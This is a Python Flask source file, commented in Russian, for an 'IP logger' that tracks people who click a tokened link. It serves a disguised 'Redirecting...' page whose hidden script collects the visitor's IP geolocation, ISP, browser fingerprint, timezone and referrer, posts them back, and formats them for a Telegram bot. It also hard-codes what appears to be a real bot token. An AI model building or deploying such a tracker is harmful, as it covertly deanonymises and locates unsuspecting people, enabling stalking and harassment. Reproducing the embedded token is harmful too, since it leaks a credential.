from flask import Flask, request, render_template_string
import requests
import os
import json

app = Flask(__name__)

# Конфигурация
BOT_TOKEN = '8227214382:AAE7l5mNa6vkCywtLWpW_LWLAuBKGwcoc-U'
TELEGRAM_API_URL = f'https://api.telegram.org/bot{BOT_TOKEN}'

# Хранилище токенов (в продакшн используйте БД)
user_tokens = {}

# HTML для IP логгера с редиректом
IP_LOGGER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
    <style>
        body {
            background: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h3>🔄 Перенаправление...</h3>
        <p>Пожалуйста, подождите</p>
    </div>
    
    <script>
        // Собираем полную информацию о пользователе
        async function collectAndSendData() {
            try {
                const token = window.location.pathname.split('/i/')[1];
                
                // Получаем IP информацию
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                
                // Собираем дополнительную информацию
                const userData = {
                    token: token,
                    ip_info: ipData,
                    user_agent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    cookie_enabled: navigator.cookieEnabled,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        color_depth: screen.colorDepth
                    },
                    viewport: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer
                };
                
                // Отправляем данные на сервер
                await fetch('/log_ip', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(userData)
                });
                
            } catch (error) {
                console.log('Data collection completed');
            }
        }
        
        // Запускаем сбор данных сразу после загрузки страницы
        collectAndSendData();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "🟢 IP Logger Server Active - ILoveYouSo"

@app.route('/i/<token>')
def ip_logger_page(token):
    """Страница IP логгера"""
    print(f"🔗 Переход по ссылке с токеном: {token}")
    return render_template_string(IP_LOGGER_HTML)

@app.route('/log_ip', methods=['POST'])
def log_ip():
    """Приём и обработка IP данных"""
    try:
        data = request.json
        token = data.get('token')
        ip_info = data.get('ip_info', {})
        
        print(f"📨 Получены данные для токена: {token}")
        print(f"🌐 IP: {ip_info.get('ip', 'Unknown')}")
        print(f"🏙️ Город: {ip_info.get('city', 'Unknown')}")
        print(f"🌍 Страна: {ip_info.get('country_name', 'Unknown')}")
        
        # Формируем сообщение для Telegram
        message = format_telegram_message(data)
        
        # Отправляем в Telegram (если известен chat_id)
        # В реальном сценарии нужно хранить связь token -> chat_id
        send_to_telegram(message)
        
        return {'status': 'success', 'message': 'Data logged'}, 200
        
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return {'status': 'error', 'message': str(e)}, 500

def format_telegram_message(data):
    """Форматирование сообщения для Telegram"""
    ip_info = data.get('ip_info', {})
    
    message = (
        "🌐 *НОВЫЙ ПЕРЕХОД ПО IP-ЛОГГЕРУ!*\n\n"
        f"🔑 *Токен:* `{data.get('token', 'Unknown')}`\n"
        f"📍 *IP:* `{ip_info.get('ip', 'Unknown')}`\n"
        f"🏙️ *Город:* {ip_info.get('city', 'Unknown')}\n"
        f"🏳️ *Регион:* {ip_info.get('region', 'Unknown')}\n"
        f"🌍 *Страна:* {ip_info.get('country_name', 'Unknown')}\n"
        f"🏢 *Провайдер:* {ip_info.get('org', 'Unknown')}\n"
        f"🕐 *Часовой пояс:* {ip_info.get('timezone', 'Unknown')}\n"
        f"💻 *Платформа:* {data.get('platform', 'Unknown')}\n"
        f"🌐 *Язык:* {data.get('language', 'Unknown')}\n"
        f"📱 *User Agent:* {data.get('user_agent', 'Unknown')[:100]}...\n"
        f"🖥️ *Экран:* {data.get('screen', {}).get('width', 'Unknown')}x{data.get('screen', {}).get('height', 'Unknown')}\n"
        f"🔗 *Реферер:* {data.get('referrer', 'Unknown')}"
    )
    
    return message

def send_to_telegram(message, chat_id=None):
    """Отправка сообщения в Telegram"""
    try:
        # Если chat_id не указан, отправляем в логи
        if not chat_id:
            print("📤 Сообщение для Telegram:")
            print(message)
            return
        
        url = f"{TELEGRAM_API_URL}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("✅ Сообщение отправлено в Telegram")
        else:
            print(f"❌ Ошибка отправки в Telegram: {response.text}")
            
    except Exception as e:
        print(f"❌ Ошибка отправки в Telegram: {e}")

# API для регистрации токенов
@app.route('/register_token', methods=['POST'])
def register_token():
    """Регистрация токена для пользователя"""
    try:
        data = request.json
        token = data.get('token')
        chat_id = data.get('chat_id')
        
        if token and chat_id:
            user_tokens[token] = chat_id
            print(f"✅ Зарегистрирован токен {token} для chat_id {chat_id}")
            return {'status': 'success'}, 200
        else:
            return {'status': 'error', 'message': 'Missing token or chat_id'}, 400
            
    except Exception as e:
        print(f"❌ Ошибка регистрации токена: {e}")
        return {'status': 'error', 'message': str(e)}, 500

@app.route('/tokens', methods=['GET'])
def list_tokens():
    """Список зарегистрированных токенов (для отладки)"""
    return {'tokens': user_tokens}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Запуск сервера на порту {port}")
    print(f"🔗 IP-логгер доступен по: http://localhost:{port}/i/YOUR_TOKEN")
    app.run(host='0.0.0.0', port=port)
